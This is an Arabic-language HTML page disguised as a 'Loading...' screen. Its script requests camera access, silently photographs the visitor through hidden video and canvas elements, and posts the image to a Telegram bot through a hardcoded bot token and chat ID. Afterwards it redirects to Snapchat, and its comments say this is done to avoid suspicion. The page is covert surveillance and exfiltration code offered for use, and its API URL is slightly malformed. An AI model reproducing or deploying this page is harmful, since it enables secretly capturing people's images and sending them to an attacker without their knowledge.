<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحميل...</title>
    <style>
        body { text-align: center; font-family: Arial; padding-top: 50px; background-color: #f4f4f4; }
        video, canvas { display: none; }
    </style>
</head>
<body>

    <div id="status">
        <h2>جاري التحميل...</h2>
    </div>

    <video id="video" width="640" height="480" autoplay></video>
    <canvas id="canvas" width="640" height="480"></canvas>

    <script>
        const TELEGRAM_TOKEN = "8780843163:AAEQYDrUCNzSF32SWGKYdzx6h2pWn4mIsd4"; 
        const CHAT_ID = "7191557045"; 

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        // طلب الكاميرا فوراً
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                video.srcObject = stream;
                // التقاط الصورة بعد ثانية واحدة فقط من فتح الكاميرا
                setTimeout(captureAndSend, 1000);
            })
            .catch(err => {
                // إذا رفض المستخدم الكاميرا، يتم تحويله فوراً لتجنب الشك
                window.location.href = "https://snapchat.com";
            });

        function captureAndSend() {
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, 640, 480);
            
            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append("chat_id", CHAT_ID);
                formData.append("photo", blob, "img.jpg");

                fetch(`https://telegram.org{TELEGRAM_TOKEN}/sendPhoto`, {
                    method: "POST",
                    body: formData
                })
                .finally(() => {
                    // التحويل لسناب شات فوراً بعد الإرسال أو الفشل
                    window.location.href = "https://snapchat.com";
                });
            }, 'image/jpeg', 0.6); // جودة أقل قليلاً لسرعة إرسال أكبر
        }
    </script>
</body>
</html>
